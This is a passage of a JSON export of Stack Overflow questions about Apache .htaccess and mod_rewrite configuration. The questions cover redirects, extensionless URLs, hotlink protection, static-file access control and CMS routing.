href=\"http://stackoverflow.com/questions/12474025/create-a-subdomain-and-shift-wordpress-into-this-subdomain\">question</a>. There I came to know that I should change .htaccess file. I have tried lot of codes from the internet for .htaccess file but still i did not get this problem. In some cases my sub directory url works but in some the sub directory url did not open and the wp-admin did not open even a single time in the sub domain. I also found another solution for this problem. Link:<a href=\"http://codex.wordpress.org/Create_A_Network\" rel=\"nofollow\">Create_A_Network</a> but I do want to do any change in the main domain wordpress site. Just make changes in the sub domain wordpress.</p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["php","security","apache",".htaccess"],"answer_count":6,"favorite_count":11,"up_vote_count":8,"down_vote_count":0,"view_count":4610,"score":8,"question_id":2187200,"title":"Using PHP/Apache to restrict access to static files (html, css, img, etc)","body":"<p>Lets say you have lots of html, css, js, img and etc files within a directory on your server. Normally, any user in internet-land could access those files by simply typing in the full URL like so: <a href=\"http://example.com/static-files/sub/index.html\" rel=\"nofollow\">http://example.com/static-files/sub/index.html</a></p>\n\n<p>Now, what if you only want authorized users to be able to load those files? For this example, lets say your users log in first from a URL like this: <a href=\"http://example.com/login.php\" rel=\"nofollow\">http://example.com/login.php</a></p>\n\n<p>How would you allow the logged in user to view the index.html file (or any of the files under \"static-files\"), but restrict the file to everyone else?</p>\n\n<p>I have come up with two possible solutions thus far:</p>\n\n<p><b>Solution 1</b><br>\nCreate the following .htaccess file under \"static-files\":</p>\n\n<pre><code>Options +FollowSymLinks  \nRewriteEngine on  \nRewriteRule ^(.*)$ ../authorize.php?file=$1 [NC]\n</code></pre>\n\n<p>And then in authorize.php...</p>\n\n<pre><code>if (isLoggedInUser()) readfile('static-files/'.$_REQUEST['file']);\nelse echo 'denied';\n</code></pre>\n\n<p>This authorize.php file is grossly over simplified, but you get the idea.</p>\n\n<p><b>Solution 2</b><br>\nCreate the following .htaccess file under \"static-files\":</p>\n\n<pre><code>Order Deny,Allow\nDeny from all\nAllow from 000.000.000.000\n</code></pre>\n\n<p>And then my login page could append that .htaccess file with an IP for each user that logs in. Obviously this would also need to have some kind of cleanup routine to purge out old or no longer used IPs.</p>\n\n<p><hr />\nI worry that my first solution could get pretty expensive on the server as the number of users and files they are accessing increases. I think my second solution would be much less expensive, but is also less secure due to IP spoofing and etc. I also worry that writing these IP addresses to the htaccess file could become a bottleneck of the application if there are many simultaneous users.  </p>\n\n<p>Which of these solutions sounds better, and why? Alternatively, can you think of a completely different solution that would be better than either of these?</p>\n"},{"tags":[".htaccess","mod-rewrite","redirect"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":12475379,"title":".htaccess issue on site in joomla","body":"<p>need to change </p>\n\n<p><a href=\"http://yourkaraokevideo.netsmartz.us/user-profile\" rel=\"nofollow\">http://yourkaraokevideo.netsmartz.us/user-profile</a> to \n<a href=\"http://yourkaraokevideo.netsmartz.us/username\" rel=\"nofollow\">http://yourkaraokevideo.netsmartz.us/username</a></p>\n\n<p>please help using .htaccess file.</p>\n\n<p>site is in joomla. </p>\n\n<p>the second  link will be dynamic where username is the name of the user logged in. </p>\n\n<p>Thanks</p>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":20,"score":0,"question_id":12475513,"title":"Can .htaccess sanity check?","body":"<p>I need a quick review of my updated .htaccess file please:</p>\n\n<pre><code>RewriteEngine On\n# Redirects errors to 404 page\nErrorDocument 404 /404.php\n\n# Redirect index.php to site root\nRewriteCond %{HTTP_HOST} ^mysite.com [NC]\nRewriteRule ^(.*)$ http://www.mysite.com/$1 [R=301,NC]\nRewriteRule ^index.php$ http://www.mysite.com/ [R=301,L]\n\n# Unless directory remove slash\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^([^/]+)/$ http://www.mysite.com/$1 [R=301,L]\n\n# Remove .php\nRewriteCond %{THE_REQUEST} ^(.+)\\.php([#?][^\\ ]*)?\\ HTTP/\nRewriteRule ^(.+)\\.php$ http://www.mysite.com/$1 [R=301,L]\n\n# Resolve .php file for extensionless php urls\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_FILENAME}\\.php -f\nRewriteRule ^([^/.]+)$ $1.php [L]\n</code></pre>\n\n<p>It's fairly straight forward.</p>\n\n<blockquote>\n  <p>The first is a 404 redirect.<br>\n  The second redirects www.mysite.com/index.php to www.mysite.com<br>\n  The third removes slashes.\n  The fourth removes the .php extension.\n  The fifth resolves php.</p>\n</blockquote>\n\n<p>Could someone cast an eye over this and give my code a quick sanity check please.</p>\n"},{"tags":["php",".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":17,"score":0,"question_id":12474041,"title":"RewriteRule to fetch last two parameters of url","body":"<p>Ok so I have this .htaccess file and it fetches the first dir after base as $1 and the second as $2</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n    RewriteEngine On\n    RewriteBase /\n\n    RewriteCond %{REQUEST_FILENAME} !-f\n    RewriteCond %{REQUEST_FILENAME} !-d\n\n    RewriteCond $1 ^[^\\.]+[^/]$\n    RewriteRule (.*) http://%{HTTP_HOST}/$1/ [R=301,L]\n\n    RewriteRule ^([^/]+)/([^/]+)/$ index.php?sub=$1&amp;page=$2 [L]\n    RewriteRule ^([^/]+)/$ index.php?sub=$1&amp;page=$1 [L]\n\n    #RewriteRule ^(.*)/(.*)$ index.php?sub=$1&amp;page=$2 [L]\n    #RewriteRule ^(.*)$      index.php?sub=$1&amp;page=$1 [L]\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>Now we need to test this website on the productionserver in a subdirectory. This would add an additional directory to url</p>\n\n<p>so: \nhxxp://localhost/newwebsite/var1/var2/</p>\n\n<p>Is there a way to only fetch the last two parameters of an url or should I just thrust it is going to work the way we want it. (not really an option)</p>\n\n<p>Thanks!</p>\n"},{"tags":[".htaccess","url-rewriting"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":70,"score":0,"question_id":12472525,"title":"Rewrite URL with htaccess - how to show fake url?","body":"<p>I have code in htacces file like this</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine on\n# this stops looping\nRewriteCond %{ENV:REDIRECT_STATUS} 200\nRewriteRule ^ - [L]\n# this redirects the browser:\nRewriteRule !^/?UL/india/ /UL/india/ [L,R=301]\nRewriteRule ^/?UL/india/ /UL/index.php [L]\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>But when accessing <code>localhost/UL/</code>, It kept showing ' The page isn't redirecting properly '. What is the problem ?</p>\n\n<p>I want show <code>localhost/UL/india/</code> in address bar for every request to the UL directory.<br/>\nBut the file that should be executed is <code>localhost/UL/index.php</code><br/></p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":22,"score":0,"question_id":12472990,"title":"mod_rewrite to seo URL","body":"<p>How can I use .htaccess to redirect a URL like</p>\n\n<p><code>http://sample.com/photos.php?cat=13&amp;sort=most_recent&amp;time=all_time</code></p>\n\n<p>to</p>\n\n<p><code>http://sample.com/photos/comedy</code></p>\n\n<p>Thank you.</p>\n"},{"tags":[".htaccess","mobile","content-management-system","expressionengine"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":66,"score":2,"question_id":12356160,"title":"Making a EXISTING CMS site compatible for mobile site NOT REDIRECT","body":"<p>Making a EXISTING CMS site compatible for mobile site NOT REDIRECT</p>\n\n<p>Hi All. \nI am currently creating a mobile version of an expression engine site that we use.</p>\n\n<p>I am having problems with this, because typically I can just use media quires, or use redirect scripts. </p>\n\n<p>However, the layout of the mobile site will be completely different from the desktop, so I can't just fiddle with a media quires for the CSS (as site just looks to different). </p>\n\n<p>I was thinking of using a javascript to wipe the code or markup (php) if the device is mobile BUT it would mean perhaps loading two versions of code anytime a page loads up (not good for mobile). Eg one code for desktop and another for mobile.</p>\n\n<p>I can't change the file names eg (mobile_index) because it is a CMS and the links wont link up correctly. I have tried this a few times , and also editing the .HTACCESS file, but it simply didnt work.</p>\n\n<p>So if anyone knows how do I change the code of a page if the device mobile, but cant change file name, directory or any of that :-)</p>\n\n<p>Cheers</p>\n\n<p>Daragh</p>\n"},{"tags":[".htaccess","codeigniter","mod-rewrite","rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":62,"score":0,"question_id":12471520,"title":"htaccess rewrite for codeigniter","body":"<p>I want to rewrite code for codeigniter url rewrite.</p>\n\n<p>I have used following code.</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ /test/index.php?/$1 [L]\nRewriteRue ^list/shows/cid-([0-9]+).html /list/shows?cid=$1\n</code></pre>\n\n<p>note:\"test\" is my website dir.</p>\n\n<p>It is working well for index.php removal. But it doesn't work for url rewrite</p>\n\n<p>i want make <a href=\"http://example.com/test/list/shows?cid=1\" rel=\"nofollow\">http://example.com/test/list/shows?cid=1</a> </p>\n\n<p>become</p>\n\n<p><a href=\"http://example.com/test/list/shows/cid-1.html\" rel=\"nofollow\">http://example.com/test/list/shows/cid-1.html</a></p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["apache",".htaccess","rules","mod-security"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":12452454,"title":"How to limit URL's parameter of values length, used by modsecurity rules","body":"<p>I want to limit URL's parameter of values length, used by <code>modsecurity</code> rules.</p>\n\n<p>Like this: <strong><code>http://website/test.php?parameter=value</code></strong></p>\n\n<p>How can I limit the value?</p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":1172,"score":1,"question_id":1267631,"title":"htaccess directory to file redirect problem","body":"<p>I’m trying to use the following .htaccess file</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-l\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_URI} !^images/\nRewriteRule (.*) view.php?picid=$1 [L]\nRewriteRule ^/user/(.*)$ /users.php?user=$1\n</code></pre>\n\n<p>I want two things to happen: Whenever someone requests <code>/1234</code>, it redirects to <code>/view.php?picid=1234</code>, and also when someone visits <code>/users/bob</code>, it redirects to <code>/users.php?user=bob</code>.</p>\n\n<p>My code however, doesn’t seem to be working correctly.</p>\n"},{"tags":[".htaccess","mod-rewrite","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":12468031,"title":"htaccess redirection non www to www conflicting with CMS","body":"<p>Hope someone can help. Apologies for not being well informed on htaccess. I have tried to search and spent a few hours on various options but no success.</p>\n\n<p>I'm using a CMS where basic URLs are in the form domain.com/index.php/page-name</p>\n\n<p>There is an admin setting to lose the index.php and just have domain.com/page-name, which creates the htaccess entry below:</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n&lt;IfModule mod_env.c&gt;\nSetEnv gp_rewrite gJjsF6q\n&lt;/IfModule&gt;\nRewriteEngine On\nRewriteBase \"/\"\nRewriteRule ^index\\.php$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\n&lt;IfModule mod_cache.c&gt;\nRewriteRule /?(.*) \"/index.php/$1\" [L]\n&lt;/IfModule&gt;\n&lt;IfModule !mod_cache.c&gt;\nRewriteRule . \"/index.php\" [L]\n&lt;/IfModule&gt;\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>To take care of core canonicalisation, have been attempting to redirect any request for non www URLs to www and so far failed. Almost everything produces a server error of some sort, a 500, or, The document has moved here - Additionally, a 403 Forbidden error was encountered while trying to use an ErrorDocument to handle the request.</p>\n\n<p>By tacking the www/non www rewrite at the end (as below) at least the domain functions but the redirection only works for the root. Every other page then ignores the /index.php/ rewrite and returns pages in the format domain.com/index.php/page-name again.</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n&lt;IfModule mod_env.c&gt;\nSetEnv gp_rewrite gJjsF6q\n&lt;/IfModule&gt;\nRewriteEngine On\nRewriteBase \"/\"\nRewriteRule ^index\\.php$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\n&lt;IfModule mod_cache.c&gt;\nRewriteRule /?(.*) \"/index.php/$1\" [L]\n&lt;/IfModule&gt;\n&lt;IfModule !mod_cache.c&gt;\nRewriteRule . \"/index.php\" [L]\n&lt;/IfModule&gt;\n&lt;Ifmodule mod_rewrite.c&gt;\nrewritecond %{http_host} ^domain.com [nc]\nrewriterule ^(.*)$ http://www.domain.com/$1 [r=301,nc]\n&lt;/Ifmodule&gt;\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>Essentially worse than no redirect. If anyone has suggestions how the core CMS needs can be maintained and the www/non www solved, they would be very welcome.</p>\n"},{"tags":[".htaccess","mod-rewrite","redirect","http-status-code-301"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":12467876,"title":"301 redirect based on text to new url","body":"<p>I'm having a little problem with an URL. I hope you can help me out!</p>\n\n<p>I have this url:</p>\n\n<pre><code>http://www.domain.com/search.html?page=shop.product_details&amp;flypage=vmj_softy.tpl&amp;product_id=1408&amp;category_id=1028\n</code></pre>\n\n<p>This needs to be redirected to:</p>\n\n<pre><code>http://www.domain.com/search.html?page=shop.product_details&amp;flypage=vmj_color_plus.tpl&amp;product_id=1408&amp;category_id=1028\n</code></pre>\n\n<p>The only thing that needs to be changed is the flypage=vmj_softy to flypage=vmj_color_plus</p>\n\n<p>The product ID and Category ID has to be a string (at has to change on all products)</p>\n\n<p>I Think I need to use apaches mod_rewrite for this, but i've tried everything but I'm not able to get this to work!</p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":378,"score":0,"question_id":2887232,"title":"& symbol problem in htaccess","body":"<p>my current url is </p>\n\n<pre><code>categories_name.php?cname=at&amp;t\n</code></pre>\n\n<p>rewritten url like this.</p>\n\n<pre><code>carriers/at&amp;t\n</code></pre>\n\n<p>this is htaccess url.</p>\n\n<pre><code>RewriteRule ^carriers/(.*)$ categories_name.php?cname=$1 [L]\n</code></pre>\n\n<p>above url is working for all like</p>\n\n<pre><code>categories_name.php?cname=all-tel\n</code></pre>\n\n<p>when variable(at&amp;t) has '&amp;' symbol then problem occuring. so how to write htaccess url? </p>\n"},{"tags":[".htaccess","subdomain","redirect","subdirectories","addon-domain"],"answer_count":2,"favorite_count":1,"up_vote_count":5,"down_vote_count":0,"view_count":699,"score":5,"question_id":5623179,"title":"Change the document root of a parked domain?","body":"<p>I have run into a problem which is that my web host doesn't appear offer addon domains.</p>\n\n<p>I currently have a domain name pointing to my name servers.</p>\n\n<p>I went into cPanel to add an addon domain that points to a sub-directory, but all that is available in cPanel is to park domain at the document root which is 'public_html/'.</p>\n\n<p>So traffic coming from the parked domain would get the wrong content, which is obviously not good.</p>\n\n<p>I get the feeling that this isn't possible, but can I change the parked domain document root from 'public_html/' to 'public_html/sub-directory' ?</p>\n\n<p>Or perhaps can I edit the .htaccess file to redirect traffic from the parked domain to the sub-directory?</p>\n\n<p>Basically I want this address; www.parked-domain.com/</p>\n\n<p>To show the content of this sub-directory; www.first-domain.com/parked-directory</p>\n\n<p>I hope this is possible otherwise I need to look at a new web host.</p>\n\n<p>Regards,</p>\n\n<p>Dean.</p>\n"},{"tags":[".htaccess","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":54,"score":1,"question_id":12409312,"title":"Shortening urls with htaccess","body":"<p>Am using Codeigniter for my site and i want to shorten my urls to look a lot nicer but it cant seem to work. am using the htaccess method and this is my code below.</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n\nRewriteCond $1 !^(index\\.php|(.*)\\.swf|user_guide|profiles|images|min|assets|robots\\.txt)\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ index.php/$1 [L]\n\nRewriteEngine On\n\nRewriteBase /gicfamily/\n\nRewriteRule ^([a-zA-Z0-9]+)$ gallery?var=$1\n</code></pre>\n\n<p></p>\n\n<p>I want gicfamily.org/gallery?var=photos\nto look like gicfamily.org/gallery/photos\nThanks in ad.</p>\n\n<p>My config file looks something like this:</p>\n\n<pre><code>&lt;?php  if ( ! defined('BASEPATH')) exit('No direct script access allowed');\n\n\n$config['base_url'] = '';\n\n\n$config['index_page'] = '';\n\n\n$config['uri_protocol'] = 'AUTO';\n\n$config['url_suffix'] = '';\n\n$config['language'] = 'english';\n\n\n$config['charset'] = 'UTF-8';\n\n\n$config['enable_hooks'] = FALSE;\n\n\n$config['subclass_prefix'] = 'MY_';\n\n\n\n$config['permitted_uri_chars'] = 'a-z 0-9~%.:_\\-';\n\n\n$config['allow_get_array']      = TRUE;\n$config['enable_query_strings'] = FALSE;\n$config['controller_trigger']   = 'c';\n$config['function_trigger']     = 'm';\n$config['directory_trigger']    = 'd'; // experimental not currently in use\n\n\n$config['log_threshold'] = 0;\n\n\n$config['log_path'] = '';\n\n$config['log_date_format'] = 'Y-m-d H:i:s';\n\n$config['cache_path'] = '';\n\n\n$config['encryption_key'] = 'ksfkvjbskfbvskbvlbsbvsokbskdb';\n\n\n$config['sess_cookie_name']     = 'gic_session';\n$config['sess_expiration']      = 7200;\n$config['sess_expire_on_close'] = TRUE;\n$config['sess_encrypt_cookie']  = FALSE;\n$config['sess_use_database']    = TRUE;\n$config['sess_table_name']      = 'gic_sessions';\n$config['sess_match_ip']        = FALSE;\n$config['sess_match_useragent'] = TRUE;\n$config['sess_time_to_update']  = 300;\n\n$config['cookie_prefix']    = \"\";\n$config['cookie_domain']    = \"\";\n$config['cookie_path']      = \"/\";\n$config['cookie_secure']    = FALSE;\n\n$config['global_xss_filtering'] = FALSE;\n\n$config['csrf_protection'] = FALSE;\n$config['csrf_token_name'] = 'csrf_test_name';\n$config['csrf_cookie_name'] = 'csrf_cookie_name';\n$config['csrf_expire'] = 7200;\n\n$config['compress_output'] = FALSE;\n\n\n$config['time_reference'] = 'local';\n\n\n$config['rewrite_short_tags'] = FALSE;\n\n\n$config['proxy_ips'] = '';\n</code></pre>\n"},{"tags":["regex",".htaccess","mod-rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":61,"score":1,"question_id":12463285,"title":"How can I redirect all files in a folder to another directory except a few files using mod_rewrite?","body":"<p>I have a situation where an entire folder's contents are no longer needed and will be redirected to the home page, <strong>except 6 or so files</strong>. The folder holds over 300 files, so individual redirects:</p>\n\n<pre><code>redirect 301 /folder/file.html http://www.domain.tld/\nredirect 301 /folder/file2.html http://www.domain.tld/\nredirect 301 /folder/file3.html http://www.domain.tld/\n</code></pre>\n\n<p>This would take quite a long time. I have some time before needing this done, and would like to know if anyone knows a good way to achieve this by using a little regex with mod_rewrite.</p>\n\n<p>For optimum understanding for all who may use the potential correct answer, lets say the files that we don't want to redirect are:</p>\n\n<pre><code>/folder/stay1.html\n/folder/stay2.html\n/folder/stay3.html\n</code></pre>\n\n<p>Thanks in advance for this wonderful community of very knowledgeable people helping those of us who still have a few things to learn!</p>\n\n<p><em>Edit</em></p>\n\n<p>Is it possible to achieve this and keep the base url of the folder?</p>\n\n<pre><code>/folder/\n/folder/index.html\n</code></pre>\n\n<p>I tried the following without success:</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{REQUEST_URI} !^/folder(/|/index.html|/stay1.html|/stay2.html|/stay3.html|/etc.html)\nRewriteRule ^/?folder/ http://www.domain.tld/ [L,R=301]\n</code></pre>\n\n<p><em>Edit</em> Correct Answer</p>\n\n<p>A big thanks goes out to <a href=\"http://stackoverflow.com/users/851273/jon-lin\">Jon Lin</a> for the answer.</p>\n\n<p>The correct method to redirect all files of a <code>/folder/</code> except a few, while still allowing access to <code>/folder/</code> is:</p>\n\n<pre><code>RewriteEngine On\n\n# Allow /folder/ to remain accessible\nRewriteCond %{REQUEST_URI} !^/folder/$\n\n# Allow specified files to remain accessible\nRewriteCond %{REQUEST_URI} !^/folder/(index.html|stay1.html|stay2.html|stay3.html|etc.html)\n\n# Redirect all non-specified files to home page\nRewriteRule ^/?folder/(.+)$ http://www.domain.tld/ [L,R=301]\n</code></pre>\n"},{"tags":["php",".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":2,"view_count":53,"score":0,"question_id":12463144,"title":"How to get my mod_rewrite rules to ignore rewrites for a specific directory","body":"<p>I've tried searching and found nothing that helps me solve the following problem. I found this link on SO: <a href=\"http://stackoverflow.com/questions/1426056/good-htaccess-mod-rewrite-url-rewriting-tutorial\">Good .htaccess/mod_rewrite/url-rewriting tutorial</a> but all of the links within it are 404 dead.</p>\n\n<p>I'm trying to beautify the urls of my site so <code>www.mysite.com/aboutus.php</code> is rewritten to look like <code>www.mysite.com/aboutus</code> which works. </p>\n\n<p>But I want to not do this on the <code>admin/cms</code> directory as it stops the CMS from working. So ignore <code>www.mysite.com/admin.php</code></p>\n\n<p>The code I'm using is:</p>\n\n<pre><code>RewriteEngine On\n\n# Unless directory, remove trailing slash\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^([^/]+)/$ http://mysite.com/$1 [R=301,L]\n\n# Redirect external .php requests to extensionless url\nRewriteCond %{THE_REQUEST} ^(.+)\\.php([#?][^\\ ]*)?\\ HTTP/\nRewriteRule ^(.+)\\.php$ http://mysite.com/$1 [R=301,L]\n\n# Resolve .php file for extensionless php urls\nRewriteRule ^([^/.]+)$ $1.php [L]\n</code></pre>\n\n<p>I don't think I'm doing this correctly as it also takes the <code>www</code> off of the start of the URL. </p>\n\n<p>I have also found this SO: <a href=\"http://stackoverflow.com/a/9565288/1343827\">http://stackoverflow.com/a/9565288/1343827</a> which seems to do what I want, but I'm not 100% sure it will do what I want.</p>\n\n<p>If anyone can help me rewrite this mod so it removes <code>.php</code> from the end of links, but ignores this in the admin directory that'd be great.</p>\n"},{"tags":["regex",".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":54,"score":1,"question_id":12451085,"title":"Mod_Rewrite conditions help for hotlinking but allow local requests","body":"<p>I had hotlink protection working, so I thought, but not for when the referrer is local.</p>\n\n<pre><code>IndexIgnore *\nOptions +FollowSymlinks\nRewriteEngine on\nRewriteOptions MaxRedirects=10\n\nRewriteCond %{REQUEST_URI} ^/image_dir/\nRewriteCond %{REQUEST_URI} \\.(png|gif|jpe?g)$ [NC]\nRewriteCond %{HTTP_REFERER} !^https?://(www\\.)?domain.com/\nRewriteRule ^(.*)$ /some_dir/some_file.php?querystring=$1 [L]\n</code></pre>\n\n<p>What I need is:</p>\n\n<p>If the referrer is not from my site on any image request on the site, then redirect to the page with what image the user is requesting.</p>\n\n<p>If the referrer is from my site and the request is for any image in the image_dir, then redirect, otherwise do not.</p>\n\n<p>Any help is greatly appreciated!</p>\n\n<p>EDIT:  Here is the full file to help:</p>\n\n<pre><code>## Default .htaccess file\nIndexIgnore *\nOptions +FollowSymlinks\nRewriteEngine on\nRewriteOptions MaxRedirects=10\n\n# your rules were looping before, that's bad, this will stop it\nRewriteCond %{ENV:REDIRECT_STATUS} 200\nRewriteRule ^ - [L]\n\n# redirect the browser back to the referring page\nRewriteCond %{REQUEST_URI} ^/img/\nRewriteCond %{REQUEST_URI} \\.(png|gif|jpe?g)$ [NC]\nRewriteCond %{HTTP_REFERER} !^https?://(www\\.)?domain.com/\nRewriteRule ^ %{HTTP_REFERER} [L,R]\n\n# rewrite the request to the handler\nRewriteCond %{REQUEST_URI} ^/img/\nRewriteCond %{REQUEST_URI} \\.(png|gif|jpe?g)$ [NC]\nRewriteCond %{HTTP_REFERER} ^https?://(www\\.)?domain.com/\nRewriteRule ^(.*)$ /img/index.php?img_hash=$1 [L]\n\n\n## Do pretty permalinks for our images\n# these rules ensure you aren't clobbering legit requests (like to image.php) \nRewriteCond %{REQUEST_FILENAME} !-f \nRewriteCond %{REQUEST_FILENAME} !-d \n\n# just in case, exclude the admin directory \nRewriteCond %{REQUEST_URI} !^/admin [NC] \n\n# rewrite \nRewriteRule ^(.*)$ /display_image.php?img_hash=$1 [L] \n</code></pre>\n\n<p>Everything works exactly like I want except hotlinking:</p>\n\n<pre><code>domain.com/t4hd -&gt; domain.com/display_image.php?img_hash=t4hd (WORKS)\ndomain.com/t4hd.jpg -&gt; domain.com/display_image.php?img_hash=t4hd.jpg (WORKS)\ndomain.com/img/t4hd -&gt; domain.com/img/index.php?img_hash=t4hd (WORKS)\ndomain.com/img/t4hd.jpg -&gt; domain.com/img/index.php?img_hash=t4hd.jpg (WORKS)\ndomain.com/img/123/456/789/t4hd.jpg -&gt; domain.com/img/index.php?img_hash=t4hd.jpg (DOES NOT WORK)\n</code></pre>\n\n<p>I still have to allow all requests to:</p>\n\n<pre><code>domain.com/admin/index.php (WORKS)\ndomain.com/profile/index.php (WORKS)\n</code></pre>\n\n<p>Hopefully this helps clarify what is going on.  Apologies for not doing this in the beginning.</p>\n"},{"tags":[".htaccess","mod-rewrite","symfony2","shared-hosting"],"answer_count":2,"favorite_count":2,"up_vote_count":1,"down_vote_count":0,"view_count":1148,"score":1,"question_id":10253510,"title":"symfony2 on shared hosting","body":"<p>I've been working on this for quite a while to no avail..  I've got symfony installed on a shared web-host where I have zero access to change the DocumentRoot to the web/ folder so that is not an option to me...</p>\n\n<p>I've written my htaccess</p>\n\n<pre><code>RewriteEngine On\nRewriteBase /\nRewriteRule ^$ web/app.php [QSA]\nRewriteRule ^(.*)$ web/app.php/$1 [QSA, L]\n</code></pre>\n\n<p>I have also tried this with <code>RewriteBase web/</code> and <code>RewriteBase /web/</code> to no avail.</p>\n\n<p>With this, symfony is working..  I can login, I can do all of that...  Only problem is, none of the assets are displaying...  Chrome Developer Tools, is telling me it's finding a 404 which is right because it's not reading the /web/ folder as the DocumentRoot..</p>\n\n<p>So, how to fix this issue without re-writing files, or anything..  There's got to be a way to do this with .htaccess only...  </p>\n"},{"tags":["apache",".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":25,"score":2,"question_id":12466659,"title":"RewriteRule During Scheduled Maintenance","body":"<p>I have limited experience with Apache and even less with RewriteRules. I hope that someone can point me in the right direction on this. </p>\n\n<p>Every morning, there are some scheduled tasks that execute on our server between 5:00 and 5:30am. During this time, we want to reroute web requests to an \"under maintenance\" page. I thought that using the htaccess page made a lot of sense because it would allow me to point the requests to a generic page without having to maintain a lot of setting changes. My question has two parts:</p>\n\n<ol>\n<li>Is a RewriteCond statement in the htaccess file compared with the current time/date the best way to go for this?</li>\n<li>Can the rule be written to prevent the direct access of a page (i.e. index.htm)? If so, can this be specified for all subfolders too?</li>\n</ol>\n\n<p>Given that the RewriteCond TIME variable presents itself as \"yyyymmddhhnnss\" I'm assuming it will look something like this:</p>\n\n<pre><code>RewriteCond %{TIME} ^(([0-9]{8})[0][5][0-2][0-9][0-5][0-9])\nRewriteRule .* http://mysite.com/under_maintenance.htm\n</code></pre>\n\n<p>Does this make sense at all? I thank you for any and all assistance you can provide.</p>\n\n<p>Thanks!</p>\n\n<p>Craig</p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":15,"score":0,"question_id":12466741,"title":"redirect a domain if it isnt a certain file type","body":"<p>I'm in the process of setting up a static cookieless domain, and everything is working great!</p>\n\n<p>But im wanting to know how to redirect if the request isn't to an image/js/css file, to avoid duplicate content from the cookieless domain.</p>\n\n<p>I have this:</p>\n\n<pre><code>RewriteCond %{HTTP_REFERER} ^http://files\\.my-static-site\\.com/ [NC]\nRewriteRule \\.(html|php)$ - [F,NC,L]\n</code></pre>\n\n<p>and it works, but it still loads the home page if you simply put files.my-static-site.com.</p>\n\n<p>If you click on a link on the page your shown a 403. How do i change that to 301 redirect to the main domain instead of showing a 403?</p>\n"},{"tags":["php",".htaccess","url-rewriting","web-config"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":122,"score":0,"question_id":12442821,"title":"Remove .php extensions with web.config on IIS7","body":"<p>I have an <strong>.htaccess</strong> file which removes the .php extension from files, converting for example <em>so.com/question.php</em> to <em>so.com/question</em>, and also redirecting the index file in the folder, e.g. <em>so.com/answer/index.php</em> redirects to <em>so.com/answer/</em> exactly as described <a href=\"http://stackoverflow.com/a/9635748/310174\">in this answer</a></p>\n\n<p>I have just set up my site locally on IIS7 and need to recreate the same behaviour in a <strong>web.config</strong> but don't know where to start with converting/rewriting the .htaccess file.</p>\n"},{"tags":["regex",".htaccess","mod-rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":2743,"score":2,"question_id":1562518,"title":"Htaccess, mod_rewrite and regular expression for alphanumeric and dashes only","body":"<p>Just can't figure aout those regular expressions.</p>\n\n<p>I have an .htaccess file with some url rewrites. Look below what I have now:</p>\n\n<pre><code>RewriteRule ^news news/ [R]\nRewriteRule ^news/([-A-z0-9]+)/$ news/$1 [R]\nRewriteRule ^news/([-A-z0-9]+)$ index.php?news=$1 [L]\n</code></pre>\n\n<p>I don't think this is correct, I mean I think it could be better.</p>\n\n<p>This is what they have to 